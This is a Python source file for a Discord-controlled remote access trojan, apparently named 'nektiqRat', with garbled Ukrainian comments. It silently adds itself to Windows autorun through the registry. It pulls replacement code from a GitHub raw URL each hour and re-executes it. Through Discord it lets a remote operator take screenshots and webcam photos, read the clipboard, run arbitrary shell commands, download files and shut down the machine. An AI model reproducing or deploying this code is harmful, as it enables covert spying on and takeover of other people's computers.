# bot_discord.py

import os
import sys
import subprocess
import tempfile
import time
import shutil
import ctypes
import threading
import requests
import winreg
import webbrowser

from threading import Thread
from pathlib import Path

import discord
from discord import File, ButtonStyle, Interaction
from discord.ext import commands
from discord.ui import View, Button, Modal, TextInput

import psutil
import cv2
import pyautogui

# ========== ĞĞĞ›ĞĞ¨Ğ¢Ğ£Ğ’ĞĞĞĞ¯ ==========

# Ğ’Ğ±ÑƒĞ´Ğ¾Ğ²Ğ°Ğ½Ğ¸Ğ¹ Ñ‚Ğ¾ĞºĞµĞ½ (Ğ²ÑÑ‚Ğ°Ğ² ÑÑĞ´Ğ¸ ÑĞ²Ñ–Ğ¹)
TOKEN = ""

# GitHub raw URL Ğ´Ğ»Ñ Ğ°Ğ²Ñ‚Ğ¾Ğ¾Ğ½Ğ¾Ğ²Ğ»ĞµĞ½Ğ½Ñ
GITHUB_RAW_URL = "https://raw.githubusercontent.com/myst1112/Discord_nektiqRat/main/bot_discord.py"
UPDATE_INTERVAL = 3600  # Ğ¿ĞµÑ€ĞµĞ²Ñ–Ñ€ÑÑ‚Ğ¸ Ñ€Ğ°Ğ· Ğ½Ğ° Ğ³Ğ¾Ğ´Ğ¸Ğ½Ñƒ

PREFIX = "!"
INTENTS = discord.Intents.default()
INTENTS.message_content = True
bot = commands.Bot(command_prefix=PREFIX, intents=INTENTS)
TMP = tempfile.gettempdir()
SCRIPT_PATH = os.path.abspath(__file__)
CLIENT_ID = f"{discord.__name__}_{os.getpid()}"

# â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€” 1. ĞĞ’Ğ¢ĞĞ—ĞĞŸĞ£Ğ¡Ğš â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”

def ensure_autorun():
    """Ğ—Ğ°Ğ¿Ğ¸ÑÑƒÑ” ÑĞµĞ±Ğµ Ğ² Ğ°Ğ²Ñ‚Ğ¾Ğ·Ğ°Ğ¿ÑƒÑĞº Windows Ñ‡ĞµÑ€ĞµĞ· Ñ€ĞµÑ”ÑÑ‚Ñ€."""
    exe_path = sys.executable
    cmd = f'"{exe_path}" "{SCRIPT_PATH}"'
    key = winreg.OpenKey(
        winreg.HKEY_CURRENT_USER,
        r"Software\Microsoft\Windows\CurrentVersion\Run",
        0, winreg.KEY_ALL_ACCESS
    )
    try:
        existing, _ = winreg.QueryValueEx(key, "DiscordPCBot")
    except FileNotFoundError:
        existing = None

    if existing != cmd:
        winreg.SetValueEx(key, "DiscordPCBot", 0, winreg.REG_SZ, cmd)
    winreg.CloseKey(key)

# Ğ¯ĞºÑ‰Ğ¾ Ğ·Ğ°Ğ¿ÑƒÑ‰ĞµĞ½Ğ¾ ÑĞº Ğ·Ñ–Ğ±Ñ€Ğ°Ğ½Ğ¸Ğ¹ .exe Ğ°Ğ±Ğ¾ Ğ·Ğ²Ğ¸Ñ‡Ğ°Ğ¹Ğ½Ğ¸Ğ¹ .py â€” Ğ·Ğ°Ğ±ĞµĞ·Ğ¿ĞµÑ‡Ğ¸Ğ¼Ğ¾ Ğ°Ğ²Ñ‚Ğ¾Ğ·Ğ°Ğ¿ÑƒÑĞº
ensure_autorun()

# â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€” 2. ĞĞ’Ğ¢ĞĞĞĞĞ’Ğ›Ğ•ĞĞĞ¯ â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”

def auto_update_loop():
    """ĞŸĞµÑ€Ñ–Ğ¾Ğ´Ğ¸Ñ‡Ğ½Ğ¾ Ğ¿Ñ–Ğ´Ñ‚ÑĞ³ÑƒÑ” Ğ¾Ğ½Ğ¾Ğ²Ğ»ĞµĞ½Ğ½Ñ Ğ· GitHub Ñ– Ğ¿ĞµÑ€ĞµĞ·Ğ°Ğ¿ÑƒÑĞºĞ°Ñ” Ğ±Ğ¾Ñ‚, ÑĞºÑ‰Ğ¾ ĞºĞ¾Ğ´ Ğ·Ğ¼Ñ–Ğ½Ğ¸Ğ²ÑÑ."""
    while True:
        try:
            resp = requests.get(GITHUB_RAW_URL, timeout=10)
            if resp.status_code == 200:
                new_code = resp.text
                with open(SCRIPT_PATH, "r", encoding="utf-8") as f:
                    old_code = f.read()
                if new_code != old_code:
                    with open(SCRIPT_PATH, "w", encoding="utf-8") as f:
                        f.write(new_code)
                    os.execv(sys.executable, [sys.executable, SCRIPT_PATH])
                    return
        except Exception:
            pass
        time.sleep(UPDATE_INTERVAL)

threading.Thread(target=auto_update_loop, daemon=True).start()

# â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€” Ğ£Ğ¢Ğ˜Ğ›Ğ†Ğ¢Ğ˜ â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”

def take_screenshot() -> str:
    path = os.path.join(TMP, f"ss_{int(time.time())}.png")
    pyautogui.screenshot(path)
    return path

def photo_camera() -> str:
    cam = cv2.VideoCapture(0)
    ret, frame = cam.read(); cam.release()
    if not ret: return None
    path = os.path.join(TMP, f"ph_{int(time.time())}.jpg")
    cv2.imwrite(path, frame)
    return path

def list_files() -> str:
    return "\n".join(os.listdir(os.getcwd())) or "(Ğ¿Ğ°Ğ¿ĞºĞ° Ğ¿Ğ¾Ñ€Ğ¾Ğ¶Ğ½Ñ)"

def save_attachment(attachment: discord.Attachment) -> str:
    path = os.path.join(os.getcwd(), attachment.filename)
    attachment.save(path)
    return path

def shutdown_pc():
    subprocess.call("shutdown /s /t 0", shell=True)

def reboot_pc():
    subprocess.call("shutdown /r /t 0", shell=True)

def sleep_pc():
    subprocess.call("rundll32.exe powrprof.dll,SetSuspendState 0,1,0", shell=True)

def turn_off_monitor():
    ctypes.windll.user32.SendMessageW(0xFFFF, 0x112, 0xF170, 2)

def change_volume(amount: int):
    # Ğ¿Ğ¾Ñ‚Ñ€ĞµĞ±ÑƒÑ” nircmd Ñƒ PATH
    cmd = f'nircmd changesysvolume {int(655.35*amount)}'
    subprocess.call(cmd, shell=True)

def execute_shell(cmd: str) -> str:
    return subprocess.getoutput(cmd)

def get_clipboard() -> str:
    try:
        import win32clipboard
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        return data
    except:
        return "(Ğ±ÑƒÑ„ĞµÑ€ Ğ¿Ğ¾Ñ€Ğ¾Ğ¶Ğ½Ñ–Ğ¹)"

def set_wallpaper(path: str):
    SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 3)

# â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€” Ğ†ĞĞ¢Ğ•Ğ ĞĞšĞ¢Ğ˜Ğ’ĞĞ• ĞœĞ•ĞĞ® â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”

class MainMenu(View):
    def __init__(self):
        super().__init__(timeout=None)
        specs = [
            ("Ğ¡ĞºÑ€Ñ–Ğ½ÑˆĞ¾Ñ‚",     "screenshot",  ButtonStyle.primary),
            ("Ğ¤Ğ¾Ñ‚Ğ¾ Ğ· ĞºĞ°Ğ¼ĞµÑ€Ğ¸","photo",       ButtonStyle.primary),
            ("Ğ¡Ğ¿Ğ¸ÑĞ¾Ğº Ñ„Ğ°Ğ¹Ğ»Ñ–Ğ²","list",        ButtonStyle.secondary),
            ("Ğ—Ğ°Ğ²Ğ°Ğ½Ñ‚Ğ°Ğ¶Ğ¸Ñ‚Ğ¸ Ñ„Ğ°Ğ¹Ğ»","upload",   ButtonStyle.secondary),
            ("Ğ’Ğ¸Ğ¼ĞºĞ½ÑƒÑ‚Ğ¸ ĞŸĞš",  "shutdown",    ButtonStyle.danger),
            ("ĞŸĞµÑ€ĞµĞ·Ğ°Ğ²Ğ°Ğ½Ñ‚Ğ°Ğ¶Ğ¸Ñ‚Ğ¸","reboot",    ButtonStyle.danger),
            ("Ğ¡Ğ¿Ğ»ÑÑ‡Ğ¸Ğ¹ Ñ€ĞµĞ¶Ğ¸Ğ¼","sleep",       ButtonStyle.secondary),
            ("Ğ’Ğ¸Ğ¼ĞºĞ½ÑƒÑ‚Ğ¸ Ğ¼Ğ¾Ğ½Ñ–Ñ‚Ğ¾Ñ€","monitor",  ButtonStyle.secondary),
            ("Ğ“ÑƒÑ‡Ğ½Ñ–ÑÑ‚ÑŒ +",   "vol_up",      ButtonStyle.secondary),
            ("Ğ“ÑƒÑ‡Ğ½Ñ–ÑÑ‚ÑŒ -",   "vol_down",    ButtonStyle.secondary),
            ("Ğ’Ñ–Ğ´ĞºÑ€Ğ¸Ñ‚Ğ¸ Google","open",      ButtonStyle.link, "https://google.com"),
            ("ĞšĞ¾Ğ¼Ğ°Ğ½Ğ´Ğ½Ğ¸Ğ¹ Ñ€ÑĞ´Ğ¾Ğº","shell",     ButtonStyle.primary),
            ("Ğ‘ÑƒÑ„ĞµÑ€ Ğ¾Ğ±Ğ¼Ñ–Ğ½Ñƒ",  "clipboard",   ButtonStyle.primary),
            ("Ğ—Ğ¼Ñ–Ğ½Ğ¸Ñ‚Ğ¸ Ğ¾Ğ±Ğ¾Ñ—",  "wallpaper",   ButtonStyle.primary),
        ]
        for label, cid, style, *url in specs:
            self.add_item(Button(
                label=label, custom_id=cid,
                style=style, url=(url[0] if url else None)
            ))

    @discord.ui.button(custom_id="screenshot")
    async def screenshot(self, btn: Button, inter: Interaction):
        path = take_screenshot()
        await inter.response.send_message(file=File(path))
        os.remove(path)

    @discord.ui.button(custom_id="photo")
    async def photo(self, btn: Button, inter: Interaction):
        path = photo_camera()
        if not path:
            return await inter.response.send_message("ĞŸĞ¾Ğ¼Ğ¸Ğ»ĞºĞ° ĞºĞ°Ğ¼ĞµÑ€Ğ¸")
        await inter.response.send_message(file=File(path))
        os.remove(path)

    @discord.ui.button(custom_id="list")
    async def lst(self, btn: Button, inter: Interaction):
        await inter.response.send_message(f"```\n{list_files()}\n```")

    @discord.ui.button(custom_id="upload")
    async def upload(self, btn: Button, inter: Interaction):
        await inter.response.send_modal(UploadModal())

    @discord.ui.button(custom_id="shutdown")
    async def shutdown_btn(self, btn: Button, inter: Interaction):
        Thread(target=shutdown_pc, daemon=True).start()
        await inter.response.send_message("Ğ’Ğ¸Ğ¼Ğ¸ĞºĞ°Ñ ĞŸĞšâ€¦")

    @discord.ui.button(custom_id="reboot")
    async def reboot_btn(self, btn: Button, inter: Interaction):
        Thread(target=reboot_pc, daemon=True).start()
        await inter.response.send_message("ĞŸĞµÑ€ĞµĞ·Ğ°Ğ²Ğ°Ğ½Ñ‚Ğ°Ğ¶ĞµĞ½Ğ½Ñâ€¦")

    @discord.ui.button(custom_id="sleep")
    async def sleep_btn(self, btn: Button, inter: Interaction):
        Thread(target=sleep_pc, daemon=True).start()
        await inter.response.send_message("Ğ¡Ğ¿Ğ»ÑÑ‡Ğ¸Ğ¹ Ñ€ĞµĞ¶Ğ¸Ğ¼â€¦")

    @discord.ui.button(custom_id="monitor")
    async def monitor_btn(self, btn: Button, inter: Interaction):
        turn_off_monitor()
        await inter.response.send_message("ĞœĞ¾Ğ½Ñ–Ñ‚Ğ¾Ñ€ Ğ²Ğ¸Ğ¼ĞºĞ½ĞµĞ½Ğ¾")

    @discord.ui.button(custom_id="vol_up")
    async def vol_up(self, btn: Button, inter: Interaction):
        change_volume(10); await inter.response.send_message("Ğ“ÑƒÑ‡Ğ½Ñ–ÑÑ‚ÑŒ +10%")

    @discord.ui.button(custom_id="vol_down")
    async def vol_down(self, btn: Button, inter: Interaction):
        change_volume(-10); await inter.response.send_message("Ğ“ÑƒÑ‡Ğ½Ñ–ÑÑ‚ÑŒ -10%")

    @discord.ui.button(custom_id="shell")
    async def shell_btn(self, btn: Button, inter: Interaction):
        await inter.response.send_modal(ShellModal())

    @discord.ui.button(custom_id="clipboard")
    async def clip_btn(self, btn: Button, inter: Interaction):
        data = get_clipboard(); await inter.response.send_message(f"```\n{data}\n```")

    @discord.ui.button(custom_id="wallpaper")
    async def wall_btn(self, btn: Button, inter: Interaction):
        await inter.response.send_modal(WallpaperModal())

# â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€” ĞœĞĞ”ĞĞ›Ğ¬ĞĞ† Ğ’Ğ†ĞšĞĞ â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”

class UploadModal(Modal):
    def __init__(self):
        super().__init__(title="Ğ—Ğ°Ğ²Ğ°Ğ½Ñ‚Ğ°Ğ¶Ğ¸Ñ‚Ğ¸ Ñ„Ğ°Ğ¹Ğ»")
        self.file_url = TextInput(label="URL Ğ°Ğ±Ğ¾ ÑˆĞ»ÑÑ…")
        self.add_item(self.file_url)

    async def on_submit(self, inter: Interaction):
        url = self.file_url.value
        try:
            if url.startswith("http"):
                r = requests.get(url, timeout=10)
                path = os.path.join(os.getcwd(), os.path.basename(url))
                open(path,"wb").write(r.content)
            else:
                shutil.copy(url, os.getcwd())
            await inter.response.send_message(f"Ğ—Ğ±ĞµÑ€ĞµĞ¶ĞµĞ½Ğ¾ Ğ² {os.getcwd()}")
        except Exception as e:
            await inter.response.send_message(f"ĞŸĞ¾Ğ¼Ğ¸Ğ»ĞºĞ°: {e}")

class ShellModal(Modal):
    def __init__(self):
        super().__init__(title="Ğ’Ğ¸ĞºĞ¾Ğ½Ğ°Ñ‚Ğ¸ ĞºĞ¾Ğ¼Ğ°Ğ½Ğ´Ñƒ")
        self.cmd = TextInput(label="ĞšĞ¾Ğ¼Ğ°Ğ½Ğ´Ğ°")
        self.add_item(self.cmd)

    async def on_submit(self, inter: Interaction):
        out = execute_shell(self.cmd.value)
        await inter.response.send_message(f"```\n{out}\n```")

class WallpaperModal(Modal):
    def __init__(self):
        super().__init__(title="Ğ—Ğ¼Ñ–Ğ½Ğ¸Ñ‚Ğ¸ Ğ¾Ğ±Ğ¾Ñ—")
        self.file_url = TextInput(label="URL Ğ°Ğ±Ğ¾ ÑˆĞ»ÑÑ…")
        self.add_item(self.file_url)

    async def on_submit(self, inter: Interaction):
        url = self.file_url.value
        try:
            if url.startswith("http"):
                r = requests.get(url, timeout=10)
                path = os.path.join(TMP, f"wall_{int(time.time())}.jpg")
                open(path,"wb").write(r.content)
            else:
                path = url
            set_wallpaper(path)
            await inter.response.send_message("ĞĞ±Ğ¾Ğ¸ Ğ·Ğ¼Ñ–Ğ½ĞµĞ½Ğ¾")
        except Exception as e:
            await inter.response.send_message(f"ĞŸĞ¾Ğ¼Ğ¸Ğ»ĞºĞ°: {e}")

# â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€” ĞšĞĞœĞĞĞ”Ğ Ğ¡Ğ¢ĞĞ Ğ¢ â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”

@bot.command(name="menu")
async def menu(ctx):
    await ctx.reply("ğŸ”§ Ğ“Ğ¾Ğ»Ğ¾Ğ²Ğ½Ğµ Ğ¼ĞµĞ½Ñ ÑƒĞ¿Ñ€Ğ°Ğ²Ğ»Ñ–Ğ½Ğ½Ñ ĞŸĞš:", view=MainMenu())

# â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€” ĞŸĞĞ”Ğ†Ğ¯ on_ready â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”

@bot.event
async def on_ready():
    print(f"âœ… Logged in as {bot.user} (ID {bot.user.id})")

# â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€” Ğ¡Ğ¢ĞĞ Ğ¢ Ğ‘ĞĞ¢Ğ â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”

bot.run(TOKEN)
